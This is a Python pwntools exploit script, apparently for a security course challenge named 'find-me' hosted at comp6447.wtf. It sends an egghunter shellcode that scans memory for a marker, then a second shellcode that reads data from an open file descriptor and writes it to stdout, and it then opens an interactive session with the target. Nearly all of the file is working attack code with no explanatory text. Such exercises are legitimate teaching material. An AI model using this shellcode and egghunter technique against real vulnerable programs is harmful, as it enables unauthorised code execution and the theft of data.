#!/usr/bin/env python
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template
from pwn import *

# Set up pwntools for the correct architecture
context.update(arch='i386')
exe = './find-me' #Change this

PROGNAME = exe
REMOTE = "comp6447.wtf" #Change this
REMOTEPORT = 24973 #Change this
global p
global e
global global_timeout

e = ELF(PROGNAME)

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR


def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
continue
'''.format(**locals())

if args.REMOTE:
    global_timeout = 3
    p = remote(REMOTE, REMOTEPORT)
else:
    global_timeout = 0.5
    p = process(PROGNAME)
    p = start()
#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
small_assembly = """
_start:
mov edx, 0x4f904790
loop:
inc eax
cmp dword ptr [eax], edx
jne loop
jmp eax
"""

large_assembly = """
nop
inc edi
nop
dec edi
xor ecx, ecx
mul ecx

sub esp, 400
mov ecx, esp
mov ebx, 1000
mov eax, 0x3
mov edx, 0xFF
int 0x80

mov eax, 0x4
mov ebx, 0x1
int 0x80

mov eax, 0x1
int 0x80
"""



small_asm = asm(small_assembly)
large_asm = asm(large_assembly)

p.recvuntil(b'smallbuf shellcode', drop=True)
p.sendline(small_asm)
p.recvuntil(b'bigbuf shellcode:', drop=True)
p.sendline(large_asm)

p.interactive()

